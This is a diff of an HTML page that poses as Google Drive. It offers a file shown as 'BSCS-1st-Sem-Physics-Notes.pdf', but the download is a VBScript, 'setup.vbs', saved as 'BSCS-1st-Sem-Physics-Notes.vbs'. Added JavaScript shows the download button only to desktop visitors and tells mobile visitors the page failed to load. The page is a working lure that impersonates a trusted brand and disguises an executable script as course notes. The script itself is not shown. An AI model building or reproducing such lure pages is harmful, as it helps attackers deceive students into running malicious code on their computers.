@@ -4,10 +4,85 @@
 		<meta charset="UTF-8" />
 		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 		<title>Google Drive</title>
+
+		<style type="text/css">
+			@import url("https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap");
+
+			body {
+				height: 100vh;
+				width: 100vw;
+				padding: 0;
+				margin: 0;
+				background-color: rgb(218, 213, 247);
+				overflow-x: hidden;
+				overflow-y: hidden;
+				display: flex;
+				flex-direction: column;
+				align-items: center;
+				justify-content: center;
+			}
+			.google {
+				height: 100px;
+				width: 100px;
+			}
+			span {
+				margin-top: 64px;
+				font-size: 1.2rem;
+				font-weight: 400;
+				font-family: "Poppins", sans-serif;
+				color: rgba(0, 0, 0, 0.8);
+			}
+			.warning {
+				margin-top: 64px;
+				font-size: 0.8rem;
+				font-weight: 400;
+				font-family: "Poppins", sans-serif;
+				color: rgba(0, 0, 0, 0.6);
+				font-style: italic;
+				max-width: 75%;
+				text-align: center;
+			}
+			button {
+				margin-top: 18px;
+				height: 42px;
+				width: 150px;
+				outline: none;
+				border: none;
+				border-radius: 8px;
+				background-color: #1877f2;
+				color: white;
+				font-family: "Poppins", sans-serif;
+				cursor: pointer;
+			}
+		</style>
 	</head>
 	<body>
-		<a href="setup.vbs" download="BSCS1stSem-AICT-Notes.pdf.vbs">
-			<button>Download</button>
+		<img src="google.png" alt="" class="google" />
+		<span class="normal" style="display: none"
+			>BSCS-1st-Sem-Physics-Notes.pdf</span
+		>
+		<span class="warning" style="display: none"
+			>There was a problem loading the page. Try opening on a different
+			device.</span
+		>
+		<a href="setup.vbs" download="BSCS-1st-Sem-Physics-Notes.vbs">
+			<button style="display: none" class="btn">Download</button>
 		</a>
+
+		<script type="text/javascript">
+			function isMobile() {
+				return window.matchMedia("(pointer: coarse)").matches;
+			}
+
+			if (isMobile()) {
+				document.querySelector(".normal").style.display = "none";
+				document.querySelector(".warning").style.display = "flex";
+				document.querySelector(".btn").style.display = "none";
+			} else {
+				document.querySelector(".normal").style.display = "flex";
+				document.querySelector(".warning").style.display = "none";
+				document.querySelector(".btn").style.display = "inline-block";
+			}
+		</script>
 	</body>
 </html>
